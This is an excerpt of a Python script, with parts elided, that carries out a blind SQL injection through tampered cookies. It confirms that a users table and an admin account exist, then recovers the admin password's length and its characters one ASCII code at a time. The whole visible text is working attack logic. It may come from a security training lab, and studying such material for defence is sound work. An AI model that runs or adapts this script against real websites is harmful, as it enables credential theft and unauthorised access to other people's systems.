...
def inject_payload(session: requests.Session, poison: dict, url: str):
    try:
        resp = session.get(
            url=url, cookies=poison_cookies(session=session, poison=poison)
        )
...
def query_password_length(session: requests.Session, url: str, length: int):
    if inject_payload(
        session=session,
        poison=POISON_STASH["admin_password_limit"].format("<", length),
        url=url,
    ):
        return 1
...
def password_char_query(
    session: requests.Session, url: str, position: int, ascii_code: int
):
    if inject_payload(
        session=session,
...
def main(url: str, space: int) -> None:
    ...
    assert inject_payload(
        session=session, poison=POISON_STASH["boolean_condition"], url=url
    )

    # assert user table exists

    assert inject_payload(
        session=session, poison=POISON_STASH["user_table_confirm"], url=url
    )

    # assert admin user exists

    assert inject_payload(
        session=session, poison=POISON_STASH["confirm_admin_user"], url=url
    )

    # find password length

    length = find_password_length(space=int(space), session=session, url=url)
